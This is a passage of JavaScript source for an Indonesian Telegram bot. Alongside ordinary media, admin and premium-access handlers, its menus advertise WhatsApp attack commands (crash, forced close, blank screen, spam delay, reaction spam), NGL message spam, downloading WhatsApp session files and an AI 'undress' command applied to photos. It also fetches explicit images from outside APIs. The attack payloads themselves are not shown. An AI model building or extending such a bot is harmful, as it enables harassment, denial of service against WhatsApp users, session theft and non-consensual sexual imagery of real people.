  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔗𝔒𝔒𝔏𝔖 𝟙═══━一</blockquote>

<blockquote>━━━【𝗠𝗲𝗱𝗶𝗮 & 𝗘𝗻𝗵𝗮𝗻𝗰𝗲】━━━</blockquote>
  ✧ /ocr ⸙  
  ╰➤ baca teks di foto  
  ✧ /hd ⸙  
  ╰➤ enhance foto  
  ✧ /hdvid ⸙  
  ╰➤ enhance video  
  ✧ /valryo ⸙  
  ╰➤ foto → video (AI)  

<blockquote>━━━【𝗦𝘁𝗶𝗰𝗸𝗲𝗿 & 𝗤𝘂𝗼𝘁𝗲】━━━</blockquote>
  ✧ /sticker ⸙  
  ╰➤ foto → stiker  
  ✧ /brat ⸙  
  ╰➤ teks → stiker brat  
  ✧ /bratvid ⸙  
  ╰➤ teks → stiker video brat  
  ✧ /qc ⸙  
  ╰➤ quoted chat stiker  
  ✧ /iqc ⸙  
  ╰➤ iPhone quote  

<blockquote>━━━【𝗧𝗲𝗸𝘀 & 𝗟𝗼𝗴𝗼】━━━</blockquote>
  ✧ /logo ⸙  
  ╰➤ flamingtext logo  
  ✧ /nulis ⸙  
  ╰➤ tulisan tangan  
  ✧ /tta ⸙  
  ╰➤ teks → suara (AI voice)  
  ✧ /gpt ⸙  
  ╰➤ jawab pakai AI GPT  

<blockquote>━━━【𝗨𝘁𝗶𝗹】━━━</blockquote>
  ✧ /shortlink ⸙  
  ╰➤ pendekkan link  
  ✧ /checksyntax ⸙  
  ╰➤ cek error JS (reply file .js)  
  ✧ /spamngl ⸙  
  ╰➤ spam pesan NGL  
  ✧ /getsession ⸙  
  ╰➤ download file session WA  
  ✧ /fixeror ⸙  
  ╰➤ fix file .js (reply file)  
  ✧ /fixcode ⸙  
  ╰➤ fix file .js (reply file)  

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/nsfw$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔑𝔖𝔉𝔚═══━一</blockquote>
<blockquote>🔞 18+ CONTENT</blockquote>

<blockquote>━━━【𝗚𝗮𝘆 & 𝗬𝗼𝗶】━━━</blockquote>
  ✧ /gay ⸙  
  ╰➤ random gay pic  

<blockquote>━━━【𝗛𝗲𝗻𝘁𝗮𝗶 & 𝗔𝗻𝗶𝗺𝗲】━━━</blockquote>
  ✧ /hentai ⸙  
  ╰➤ random hentai  
  ✧ /girljapan ⸙  
  ╰➤ cewe Jepang 18+  
  ✧ /girlchina ⸙  
  ╰➤ cewe China 18+  
  ✧ /girlindonesia ⸙  
  ╰➤ cewe Indo 18+  

<blockquote>━━━【𝗩𝗶𝗱𝗲𝗼 & 𝗦𝗲𝗮𝗿𝗰𝗵】━━━</blockquote>
  ✧ /sendbokep ⸙  
  ╰➤ kirim bokep ke user (owner only)  
  ✧ /telkon ⸙  
  ╰➤ AI buka baju (reply foto)  

<blockquote>© Valtix-Invicta OFAU – 18+</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/fun$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔉𝔘𝔑═══━一</blockquote>

<blockquote>━━━【𝗣𝗮𝗻𝘁𝘂𝗻 & 𝗞𝗮𝘁𝗮】━━━</blockquote>
  ✧ /pantun ⸙  
  ╰➤ pantun random (lucu|cinta|bijak)  
  ✧ /katahariini ⸙  
  ╰➤ quote bijak  
  ✧ /motivasi ⸙  
  ╰➤ semangat pagi  
  ✧ /faktaunik ⸙  
  ╰➤ fakta random  

<blockquote>━━━【𝗪𝗮𝗸𝘁𝘂 & 𝗖𝘂𝗮𝗰𝗮】━━━</blockquote>
  ✧ /hariini ⸙  
  ╰➤ tanggal & waktu  
  ✧ /cuaca ⸙  
  ╰➤ ramalan cuaca  

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/group$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔊ℝ𝕆𝕌ℙ═══━一</blockquote>

<blockquote>━━━【𝗔𝗱𝗺𝗶𝗻 & 𝗧𝗮𝗴】━━━</blockquote>
  ✧ /tagadmin ⸙  
  ╰➤ mention semua admin  
  ✧ /admins ⸙  
  ╰➤ daftar admin  
  ✧ /groupinfo ⸙  
  ╰➤ info grup  
  ✧ /setrules ⸙  
  ╰➤ simpan aturan  
  ✧ /rules ⸙  
  ╰➤ lihat aturan  

<blockquote>━━━【𝗔𝗻𝘁𝗶 & 𝗦𝗲𝘁】━━━</blockquote>
  ✧ /antilink on/off ⸙  
  ╰➤ anti-link switch  

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});


bot.onText(/^\/info$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝕀ℕ𝔽𝕆═══━一</blockquote>

<blockquote>━━━【𝗕𝗼𝘁 & 𝗦𝘆𝘀𝘁𝗲𝗺】━━━</blockquote>
  ✧ /fileinfo ⸙  
  ╰➤ info file yang dikirim  
  ✧ /uptime ⸙  
  ╰➤ lama bot aktif  
  ✧ /speed ⸙  
  ╰➤ kecepatan respon bot  
  ✧ /panelinfo ⸙  
  ╰➤ info panel/host (owner only)  

<blockquote>━━━【𝗨𝘀𝗲𝗿】━━━</blockquote>
  ✧ /cekid ⸙  
  ╰➤ ID & username kamu  
  ✧ /whoami ⸙  
  ╰➤ data profil lengkap  
  ✧ /chatowner ⸙  
  ╰➤ kirim saran ke owner  

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }]
      ]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/attack$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  try { await bot.deleteMessage(chatId, msg.message_id) } catch {}
  const prev = lastMsg.get(userId);
  if (prev) try { await bot.deleteMessage(chatId, prev) } catch {}

  // Pilih gambar random (sesuai fungsi kamu)
  const pic = getRandomVid();

  const sent = await bot.sendVideo(chatId, pic, {
    caption: `
<blockquote>╭▄︻デ𝔖𝕀𝕃𝔼ℕ𝕋 𝔾𝕌ℕ═══━一</blockquote>

<blockquote>━━━【𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲】━━━</blockquote>
  ✧ /VtxLagStorm ⸙  
  ╰➤ bebas spam delay     
  ✧ /VtxDelayPerma ⸙  
  ╰➤ spam delay permanent    

<blockquote>━━━【𝗩𝗶𝘀𝗶𝗯𝗹𝗲】━━━</blockquote>
  ✧ /VtxCrashV1 ⸙  
  ╰➤ Force close invisible Call  
  ✧ /VtxCrashV2 ⸙  
  ╰➤ Crash WA visible
  ✧ /VtxBlankEvol ⸙  
  ╰➤ Blank screen evolutive

<blockquote>━━━【MENU LAIN】━━━</blockquote>
  ✧ /reactch ⸙  
  ╰➤ spam reaction channel WA  
  ✧ /tryfunc ⸙  
  ╰➤ uji coba function bug

<blockquote>© Valtix-Invicta OFAU</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [[
        { text: "« ᴋᴇᴍʙᴀʟɪ", callback_data: "mainmenu" }
      ]]
    }
  });

  lastMsg.set(userId, sent.message_id);
});

bot.onText(/^\/addbot\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, ""); 

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/Admin* yang dapat menjalankan perintah ini.
`, { parse_mode: "Markdown" });
  }

  if (!botNumber || botNumber.length < 8) {
    return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/addbot 628xxxxxx\`
`, { parse_mode: "Markdown" });
  }

  try {
    await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

    await connectToWhatsApp(botNumber, chatId);

    await bot.sendMessage(chatId, `
✅ *Berhasil terhubung!*
Bot WhatsApp aktif dengan nomor: *${botNumber}*
`, { parse_mode: "Markdown" });

  } catch (error) {
    console.error("❌ Error in /addbot:", error);
    bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
  }
});
           
/// --- ( case group only ) --- \\\     
bot.onText(/^\/gruponly\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();
  const status = mode === "on";

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Perintah ini hanya bisa digunakan oleh *Owner/Admin*.`, { parse_mode: "Markdown" });
  }

  try {
    const data = { groupOnly: status };
    fs.writeFileSync(ONLY_FILE, JSON.stringify(data, null, 2));

    bot.sendMessage(chatId, `
⚙️ *Mode Group Only* berhasil diperbarui!
Status: *${status ? "AKTIF ✅" : "NONAKTIF ❌"}*
`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("Gagal menyimpan status Group Only:", err);
    bot.sendMessage(chatId, `
❌ Terjadi kesalahan saat menyimpan konfigurasi.
${err.message}
`, { parse_mode: "Markdown" });
  }
});

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1].toLowerCase();

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
  }

  const timeValue = parseInt(duration);
  const timeUnit = duration.endsWith("d") ? "days" :
                   duration.endsWith("h") ? "hours" : "minutes";
  const expirationDate = moment().add(timeValue, timeUnit);

  const existingUser = premiumUsers.find(u => u.id === userId);
  if (existingUser) {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  } else {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  }

  console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});

/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case add admin ) ---
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 58273654 30d
`);
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menambahkan admin!
Kini user ${userId} memiliki akses admin.
`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
  }
});


// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.`);
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 584726249`);
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
  }

  const index = premiumUsers.findIndex(user => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});


// --- ( case delete acces admin ) ---
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 5843967527`);
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses admin.`);
  }
});


// --- ( Case Tools Menu ) --- \\
const ffmpeg = require("fluent-ffmpeg");
const { writeFile, unlink, mkdir } = require("fs").promises;
const { existsSync } = require("fs");

bot.onText(/^\/hdvid$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  let inputPath, outputPath;

  try {
    // Validasi reply video
    if (!reply || !reply.video) {
      return bot.sendMessage(
        chatId,
        "❌ *Reply ke video* (mp4 / mov / avi / mkv)",
        { parse_mode: "Markdown" }
      );
    }

    const mime = reply.video.mime_type || "";
    if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
      return bot.sendMessage(
        chatId,
        "❌ Format tidak didukung!\nHanya mp4 / mov / avi / mkv",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "⏳ *Sedang memproses video HD*\nMohon tunggu ±2–4 menit...",
      { parse_mode: "Markdown" }
    );

    // Download video dari Telegram
    const fileLink = await bot.getFileLink(reply.video.file_id);
    const res = await axios.get(fileLink, { responseType: "arraybuffer" });
    const videoBuffer = Buffer.from(res.data);

    if (!videoBuffer.length) {
      return bot.sendMessage(chatId, "❌ Gagal mengunduh video!");
    }

    // Temp folder
    const tempDir = path.join(__dirname, "tmp");
    if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });

    inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
    outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);

    await writeFile(inputPath, videoBuffer);

    // Proses FFmpeg
    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .outputOptions([
          "-vf",
          "scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8",
          "-r", "60",
          "-preset", "faster",
          "-crf", "25",
          "-c:v", "libx264",
          "-pix_fmt", "yuv420p",
          "-c:a", "aac",
          "-b:a", "128k"
        ])
        .on("end", resolve)
        .on("error", reject)
        .save(outputPath);
    });

    // Kirim hasil
    await bot.sendVideo(
      chatId,
      outputPath,
      { caption: "✅ Video berhasil ditingkatkan kualitasnya!" }
    );

  } catch (e) {
    console.error("[HDVID ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Gagal meningkatkan kualitas video."
    );
  } finally {
    // Cleanup
    setTimeout(async () => {
      try { if (inputPath) await unlink(inputPath); } catch {}
      try { if (outputPath) await unlink(outputPath); } catch {}
    }, 5000);
  }
});

bot.onText(/^\/snackvideos(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1]?.trim();

  try {
    if (!username) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/snackvideos <username>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "⏳ *Searching SnackVideo profile...*",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.deline.web.id/search/snackvideo?username=${encodeURIComponent(username)}`
    );

    if (!data?.status) {
      return bot.sendMessage(
        chatId,
        "❌ *User not found.*",
        { parse_mode: "Markdown" }
      );
    }

    const profile = data.result.profile;
    const videos = data.result.videos || [];

    let message =
`🎬 *SnackVideo Profile*
👤 *${profile.nama}* (@${profile.id})
📦 Total Videos: *${profile.total_video}*
❤️ Likes: *${profile.total_like}*
👥 Followers: *${profile.followers}*

🖼 Profile Picture:
${profile.foto_profil}

📁 *Video List*

`;

    videos.forEach((v, i) => {
      message +=
`*${i + 1}. ${v.judul_video}*
📝 ${v.deskripsi || "No description"}
📅 Upload: \`${v.tanggal_upload}\`
👁 Views: *${v.views}* | ❤️ Likes: *${v.likes}* | 🔁 Shares: *${v.shares}*

🔗 Page: ${v.url_halaman}
🎥 Video: ${v.url_file_video}

`;
    });

    // Pecah pesan panjang (limit Telegram ±4096)
    const chunkSize = 3500;
    for (let i = 0; i < message.length; i += chunkSize) {
      await bot.sendMessage(
        chatId,
        message.substring(i, i + chunkSize),
        {
          parse_mode: "Markdown",
          disable_web_page_preview: true
        }
      );
    }

  } catch (e) {
    console.error("[SNACKVIDEOS ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *SNACKVIDEO SEARCH ERROR*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/happymodsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  try {
    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/happymodsearch <app name>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      `⏳ *Searching HappyMod Apps...*\n🔍 *Keyword:* ${query}\nPlease wait...`,
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.deline.web.id/search/happymod?q=${encodeURIComponent(query)}`
    );

    if (!data?.status || !Array.isArray(data.result) || data.result.length === 0) {
      return bot.sendMessage(
        chatId,
        `❌ *No results found for:* ${query}`,
        { parse_mode: "Markdown" }
      );
    }

    let message =
`🔍 *HappyMod Search Result*

*Keyword:* ${query}
*Total Found:* ${data.result.length}

`;

    data.result.forEach((v, i) => {
      message +=
`*${i + 1}. ${v.title}*
📦 Package: \`${v.package}\`
📁 Size: ${v.size}
🧬 Version: ${v.version}
🔧 Mod: ${v.modInfo || "-"}
🔗 Download: ${v.page_dl}

`;
    });

    await bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error("[HAPPYMODSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *HAPPYMOD SEARCH ERROR*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/gay$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Gay*...",
      { parse_mode: "Markdown" }
    );

    const res = await axios.get(
      "https://api.nekolabs.web.id/random/nsfwhub/gay",
      { responseType: "arraybuffer" }
    );

    const imgBuffer = Buffer.from(res.data);

    await bot.sendVideo(
      chatId,
      imgBuffer,
      { caption: "🎴 Random Gay" }
    );

  } catch (e) {
    console.error("[GAY ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Gagal mengambil gambar Gay!"
    );
  }
});

bot.onText(/^\/hentai$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(
      chatId,
      "⏳ Sedang mengambil gambar *Hentai*...",
      { parse_mode: "Markdown" }
    );

    const res = await axios.get(
      "https://api.nekolabs.web.id/random/nsfwhub/hentai",
      { responseType: "arraybuffer" }
    );

    const imgBuffer = Buffer.from(res.data);

    await bot.sendVideo(
      chatId,
      imgBuffer,
      { caption: "🎴 Random Hentai" }
    );

  } catch (e) {
    console.error("[HENTAI ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ Gagal mengambil gambar Hentai!"
    );
  }
});

/* -------------------- JAPAN -------------------- */
bot.onText(/^\/girljapan$/, async (msg) => {
  const chatId = msg.chat.id;
  const waitMsg = await bot.sendMessage(chatId, "⏳ <b>Japanese Girl</b> – preparing...", { parse_mode: "HTML" });

  const url = "https://api.nekolabs.web.id/random/girl/japan";
  const MAX_RETRY = 3;
  let attempt = 0;

  while (attempt++ < MAX_RETRY) {
    try {
      const { data, headers } = await axios.get(url, {
        responseType: "arraybuffer",
        timeout: 15000,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
          "Referer": "https://nekolabs.web.id/"
        },
        validateStatus: s => s < 500
      });

      const contentType = headers["content-type"] || "";
      const buffer = Buffer.from(data);

      if (contentType.includes("image")) {
        await bot.editMessageText("📤 Upload image...", { chat_id: chatId, message_id: waitMsg.message_id });
        return bot.sendPhoto(chatId, buffer, { caption: "🇯🇵 Japanese Girl – HD" });
      }
      if (contentType.includes("video") || contentType.includes("gif")) {
        await bot.editMessageText("📤 Upload video...", { chat_id: chatId, message_id: waitMsg.message_id });
        return bot.sendVideo(chatId, buffer, { caption: "🇯🇵 Japanese Girl – HD" });
      }
      if (contentType.includes("json")) {
        const json = JSON.parse(buffer.toString());
        if (json.base64) {
          const media = Buffer.from(json.base64, "base64");
          return bot.sendPhoto(chatId, media, { caption: "🇯🇵 Japanese Girl – base64" });
        }
      }
      return bot.sendDocument(chatId, buffer, {}, { filename: "JapaneseGirl.jpg" });

    } catch (e) {
      console.error(`[GIRL-JAPAN] attempt ${attempt}`, e.message);
      if (attempt === MAX_RETRY) {
        const errReport = `❌ <b>Gagal mengambil Japanese Girl</b>\n<code>${e.message}</code>`;
        await bot.editMessageText(errReport, { chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML" });
      } else {
        await bot.editMessageText(`⏳ Retry ${attempt}/${MAX_RETRY}...`, { chat_id: chatId, message_id: waitMsg.message_id });
        await new Promise(r => setTimeout(r, 2000));
      }
    }
  }
});

/* -------------------- INDONESIA -------------------- */
bot.onText(/^\/girlindonesia$/, async (msg) => {
  const chatId = msg.chat.id;
  const waitMsg = await bot.sendMessage(chatId, "⏳ <b>Indonesian Girl</b> – preparing...", { parse_mode: "HTML" });

  const url = "https://api.nekolabs.web.id/random/girl/indonesia";
  const MAX_RETRY = 3;
  let attempt = 0;

  while (attempt++ < MAX_RETRY) {
    try {
      const { data, headers } = await axios.get(url, {
        responseType: "arraybuffer",
        timeout: 15000,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
          "Referer": "https://nekolabs.web.id/"
        },
        validateStatus: s => s < 500
      });

      const contentType = headers["content-type"] || "";
      const buffer = Buffer.from(data);

      if (contentType.includes("image")) {
        await bot.editMessageText("📤 Upload image...", { chat_id: chatId, message_id: waitMsg.message_id });
        return bot.sendPhoto(chatId, buffer, { caption: "🇮🇩 Indonesian Girl – HD" });
      }
      if (contentType.includes("video") || contentType.includes("gif")) {
        await bot.editMessageText("📤 Upload video...", { chat_id: chatId, message_id: waitMsg.message_id });
        return bot.sendVideo(chatId, buffer, { caption: "🇮🇩 Indonesian Girl – HD" });
      }
      if (contentType.includes("json")) {
        const json = JSON.parse(buffer.toString());
        if (json.base64) {
          const media = Buffer.from(json.base64, "base64");
          return bot.sendPhoto(chatId, media, { caption: "🇮🇩 Indonesian Girl – base64" });
        }
      }
      return bot.sendDocument(chatId, buffer, {}, { filename: "IndonesianGirl.jpg" });

    } catch (e) {
      console.error(`[GIRL-INDONESIA] attempt ${attempt}`, e.message);
      if (attempt === MAX_RETRY) {
        const errReport = `❌ <b>Gagal mengambil Indonesian Girl</b>\n<code>${e.message}</code>`;
        await bot.editMessageText(errReport, { chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML" });
      } else {
        await bot.editMessageText(`⏳ Retry ${attempt}/${MAX_RETRY}...`, { chat_id: chatId, message_id: waitMsg.message_id });
        await new Promise(r => setTimeout(r, 2000));
      }
    }
  }
});

/* -------------------- CHINA -------------------- */
bot.onText(/^\/girlchina$/, async (msg) => {
  const chatId = msg.chat.id;
  const waitMsg = await bot.sendMessage(chatId, "⏳ <b>Chinese Girl</b> – preparing...", { parse_mode: "HTML" });

  const url = "https://api.nekolabs.web.id/random/girl/china";
  const MAX_RETRY = 3;
  let attempt = 0;

  while (attempt++ < MAX_RETRY) {
    try {
      const { data, headers } = await axios.get(url, {
        responseType: "arraybuffer",
        timeout: 15000,
        headers: {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
          "Referer": "https://nekolabs.web.id/"
        },
        validateStatus: s => s < 500   // retry only server error
      });

      const contentType = headers["content-type"] || "";
      const buffer = Buffer.from(data);

      // ---------- auto handler ----------
      if (contentType.includes("image")) {
        await bot.editMessageText("📤 Upload image...", { chat_id: chatId, message_id: waitMsg.message_id });
        return bot.sendPhoto(chatId, buffer, { caption: "🇨🇳 Chinese Girl – HD" });
      }
      if (contentType.includes("video") || contentType.includes("gif")) {
